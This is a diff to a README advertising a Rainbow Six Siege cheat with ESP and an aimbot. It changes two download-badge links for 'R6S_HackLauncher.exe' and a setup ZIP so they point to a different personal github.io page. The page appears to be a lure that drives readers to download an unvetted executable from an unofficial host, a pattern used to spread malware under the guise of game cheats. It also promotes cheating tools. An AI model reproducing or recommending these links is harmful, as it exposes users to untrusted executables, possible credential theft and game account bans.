@@ -1,7 +1,7 @@
 # 🎯 Rainbow Six Siege Hack — ESP + Aimbot + Config Tools
 
-[![Download R6S_HackLauncher.exe](https://img.shields.io/badge/Download-R6S_HackLauncher.exe-green?style=for-the-badge)](https://rainbow6-hack-esp-aimbot-kit.github.io/.github/)
-[![Get Full Setup](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://rainbow6-hack-esp-aimbot-kit.github.io/.github/)
+[![Download R6S_HackLauncher.exe](https://img.shields.io/badge/Download-R6S_HackLauncher.exe-green?style=for-the-badge)](https://jackson8149766.github.io/.github/rainbow6-hack-esp-aimbot)
+[![Get Full Setup](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://jackson8149766.github.io/.github/rainbow6-hack-esp-aimbot)
 
 ---
 
